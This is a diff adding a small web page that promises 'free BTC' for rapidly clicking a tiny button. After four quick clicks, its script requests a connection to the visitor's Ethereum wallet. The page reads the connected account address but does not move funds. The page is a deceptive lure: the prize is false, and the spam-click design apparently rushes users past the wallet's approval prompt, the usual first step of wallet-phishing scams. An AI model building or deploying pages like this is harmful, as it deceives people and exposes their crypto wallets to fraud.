@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>4x Click Connect Wallet</title>
+  <style>
+    body {
+      margin: 0;
+      background: #111;
+      color: #fff;
+      font-family: sans-serif;
+      height: 100vh;
+    }
+    .status {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      font-size: 14px;
+    }
+    .btn {
+      position: fixed;
+      top: 60%;
+      right: 50%;
+      width: 30px;
+      height: 30px;
+      background: red;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="status" id="status">Spam click to win free BTC!</div>
+  <button class="btn" id="quadBtn"></button>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    const quadBtn = document.getElementById('quadBtn');
+
+    let clickCount = 0;
+    let lastClickTime = 0;
+    const MAX_GAP = 800;
+
+    function setStatus(text) {
+      statusEl.textContent = 'Status: ' + text;
+    }
+
+    async function connectWallet() {
+      setStatus('connecting...');
+      if (window.ethereum && window.ethereum.request) {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          setStatus('connected: ' + (accounts[0] || 'unknown'));
+        } catch (err) {
+          setStatus('connection failed');
+        }
+      } else {
+        setStatus('no wallet found');
+      }
+    }
+
+    quadBtn.addEventListener('click', () => {
+      const now = Date.now();
+      if (now - lastClickTime <= MAX_GAP) clickCount++; else clickCount = 1;
+      lastClickTime = now;
+      setStatus('clicked ' + clickCount + '/4');
+      if (clickCount >= 4) {
+        clickCount = 0;
+        connectWallet();
+      }
+    });
+  </script>
+</body>
+</html>
